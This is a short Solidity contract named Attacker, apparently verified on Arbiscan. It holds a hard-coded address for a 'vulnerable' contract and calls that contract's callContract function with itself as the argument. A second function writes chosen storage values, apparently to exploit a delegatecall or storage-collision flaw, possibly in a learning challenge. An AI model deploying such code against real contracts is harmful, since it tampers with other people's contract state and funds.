/**
 *Submitted for verification at Arbiscan on 2022-10-18
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract Attacker {
    uint256 public s_variable;
    uint256 public s_otherVar;
    address public immutable i_owner;
    address public immutable vulnerableContract;

    constructor() {
        i_owner = msg.sender;
        vulnerableContract = 0x62e7C70Ede70bAC1a62b20d2064025b2eB05d9C3;
    }

    function getOwner() public view returns (address) {
        return i_owner;
    }

    function doSomething() public returns (bool) {
        s_variable = 123;
        s_otherVar = 2;
        return true;
    }

    function doSomethingAgain() public returns (bool) {
        (bool success, ) = vulnerableContract.call(
            abi.encodeWithSignature("callContract(address)", address(this))
        );
        return success;
    }


}